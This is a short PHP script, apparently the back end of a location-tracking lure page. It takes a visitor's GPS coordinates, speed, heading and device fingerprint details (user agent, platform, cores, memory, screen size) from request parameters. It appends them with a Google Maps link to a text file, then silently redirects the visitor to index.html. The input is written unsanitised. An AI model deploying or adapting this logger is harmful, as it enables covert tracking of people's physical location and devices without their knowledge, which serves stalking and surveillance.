<?php
file_put_contents("geolocate.txt",
"Latitude: " . $_GET['latitude'] . "\n"
. "Longitude: " . $_GET["longitude"] . "\n"
. "User-Agent: " . $_GET["useragent"] . "\n"
. "Altitude: " . $_GET["altitude"] . "\n"
. "Accuracy: " . $_GET["accuracy"] . "\n"
. "Speed: "  . $_GET["speed"] . "\n"
. "Heading: " . $_GET["heading"] . "\n"
. "Platform: " . $_GET["platform"] . "\n"
. "Product: " .$_GET["product"] ."\n"
. "Cores: " .$_GET["hardware"] . "\n"
. "Memory: " .$_GET["memory"] ."GB of RAM"."\n"
. "Resolution: " .$_GET["width"]."x".$_GET["height"]."\n"
. "Maps : https://www.google.com/maps/place/".$_GET['latitude'] ."+".$_GET["longitude"]."\n\n", FILE_APPEND);

header('Location: index.html');
exit();
?>
